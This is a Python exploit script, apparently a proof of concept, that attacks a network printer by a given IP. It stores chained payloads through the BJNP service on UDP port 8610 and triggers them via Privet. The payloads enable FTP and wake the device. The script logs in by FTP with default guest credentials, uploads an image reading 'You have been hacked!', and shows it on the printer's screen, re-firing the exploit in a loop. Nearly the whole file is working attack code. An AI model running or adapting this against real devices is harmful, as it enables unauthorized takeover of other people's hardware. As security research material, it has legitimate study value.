#!/usr/bin/env python3
import time
import ftplib
import socket
import tempfile
import argparse
from PIL import Image, ImageDraw, ImageFont

import bjnp
import privet
import payloads
import fw_version


def step1(target, version, debug):
    bjnp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bjnp_sock.connect((target, 8610))

    # Cleanup previous payload (just in case)
    bjnp.cleanup_payload(bjnp_sock, debug=debug)

    # Store our payload in the bjnp struct
    bjnp_payload = payloads.ChainedPayload(version=version, payloads=[
        # Enable ftp to upload a file later on
        payloads.EnableFtpdPayload(version=version),
        # Change FTP directory (should already be in S: by default)
        payloads.FtpdChangeDirectoryPayload("S:/", version=version),
        # Set energy save to 0 to wake the printer up
        payloads.SetEnergySave(0, version=version),
    ])
    bjnp.store_payload(bjnp_sock, bjnp_payload, debug=debug)

    # Execute the exploit
    privet_payload = privet.PrivetPayload(version=version)
    privet.execute_payload(target, privet_payload, debug=debug)

    # Cleanup
    bjnp_sock.close()
    time.sleep(5)


def step2(target, version, debug):
    # Generate an image
    img = Image.new("RGB", (320, 240), color=(0, 0, 0))
    d = ImageDraw.Draw(img)

    try:
        font = ImageFont.truetype("Pillow/Tests/fonts/FreeSans.ttf", 20)
    except OSError:
        font = ImageFont.load_default()

    d.multiline_text((10, 10), "Hello, World!\nYou have been hacked!\nAll your printers are belong to us\n=0.0=", font=font, fill=(255, 0, 0))

    # Upload our image using FTP
    tries = 0
    while tries < 10:
        with ftplib.FTP(host=target, user="guest", passwd="welcome.") as ftp:
            if debug:
                ftp.debug(2)

            try:
                ftp.dir()
                ftp.delete("a")
            except ftplib.error_perm:
                pass

            print("\n--\n")

            with tempfile.TemporaryFile() as f:
                f.write(img.tobytes())
                f.seek(0)
                try:
                    ftp.storbinary("STOR a", f)
                    ftp.dir()
                    break
                except ftplib.error_perm:
                    pass

        tries += 1
        time.sleep(2)


def step3(target, version, debug):
    bjnp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bjnp_sock.connect((target, 8610))

    # Cleanup previous payload
    bjnp.cleanup_payload(bjnp_sock, debug=debug)

    # Store our payload in the bjnp struct
    bjnp_payload = payloads.ChainedPayload(version=version, payloads=[
        # Fill screen with black
        payloads.ColorFillScreen(0, version=version),
        # Display our image on the screen
        payloads.DisplayBMP("S:/a", x=0, y=0, version=version),
    ])
    bjnp.store_payload(bjnp_sock, bjnp_payload, debug=debug)

    # Execute the exploit
    privet_payload = privet.PrivetPayload(version=version)
    privet.execute_payload(target, privet_payload, debug=debug)

    # Cleanup
    bjnp_sock.close()
    time.sleep(5)


def main(target, debug):
    version = fw_version.get_version(target, debug)

    step1(target, version, debug)
    step2(target, version, debug)
    step3(target, version, debug)

    try:
        while True:
            privet_payload = privet.PrivetPayload(version=version)
            privet.execute_payload(target, privet_payload, debug=debug)
            time.sleep(0.5)
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", help="Printer IP", default="172.16.71.1")
    parser.add_argument("-d", "--debug", help="Debug mode", action="store_true", default=False)
    args = parser.parse_args()
    main(args.target, args.debug)
